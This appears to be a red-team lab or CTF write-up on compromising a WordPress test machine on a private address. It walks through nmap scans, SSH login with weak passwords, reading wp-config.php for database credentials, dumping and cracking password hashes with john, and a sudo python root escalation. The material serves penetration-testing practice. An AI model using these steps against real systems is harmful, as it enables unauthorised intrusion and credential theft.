Table of Contents
* Exposed Services
* Critical Vulnerabilities
* Exploitation

**Exposed Services**

Nmap scan results for each machine reveal the below services and OS details:

    nmap -sn 192.168.1.0/24 to find Target 1 IP machine
          
    nmap -sV 192.168.1.110 to check open ports and services
  # 

**Critical Vulnerabilities**

This scan identifies the services below as potential points of entry:
Target 1
Port 22/TCP Open SSH
Port 80/TCP Open HTTP
Port 111/TCP Open RPCbind
Port 139/TCP Open Netbios-SSN
Port 445/TCP Open Netbios-SSN

The following vulnerabilities were identified on each target:
Target 1

* User Enumeration, Severity: Medium, CVE-2017-5487
* Weak User Password
* Mismanaged User privileges
* Unsalted Hash Password

**Exploitation**

The Red Team was able to penetrate Target 1 and retrieve the following confidential data:
Target 1
flag1.txt: {b9bbcb33e11b80be759c4e844862482d}
The exploit used to find flag one was file traversal.
1. ssh michael@192.168.1.110
2. password michael
3. cd /
4. cd var/www/html
5. ls
6. nano service.html 
7. Within service.html: Ctrl-w flag or cat service.html | grep flag

flag2.txt: {fc3fd58dcdad9ab23faca6e9a36e581c}
File traversal was used again to find flag2.
1. ssh michael@192.168.1.110
2. password michael
3. cd /
4. cd var/www
5. ls
6. cat flag2.txt

Finding the MySQL database password.
cat /var/www/html/wordpress/wp-config.php


Use the credentials to log into MySQL and dump WordPress user password hashes.
1. mysql -u root -p
2. R@v3nSecurity
3. show databases;
4. use wordpress;
5. show tables;
6. SELECT * FROM wp_users;

SELECT * FROM wp_user INTO OUTFILE ‘/home/michael/wp_hashes.txt’;
Dumps table to a .txt file./home

Nano the file and change it to a format john reads.	
Change user1 and 2 to Michael and steven.

SELECT * FROM wp_posts
Reading the other tables to get flags 3 and 4

Crack password hashes with john.

    john --wordlist=/usr/share/wordlists/rockyou.txt wp-hashes.txt 
    john --show hashed_passwords.txt

Secure a user shell as the user whose password you cracked.
* ssh steven@192.168.1.110
* pink84

Escalate to root. One flag can be discovered after this step.
* sudo -l
* sudo python -c 'import pty;pty.spawn("/bin/bash")'

locate flag

* cat /root/flag4.txt




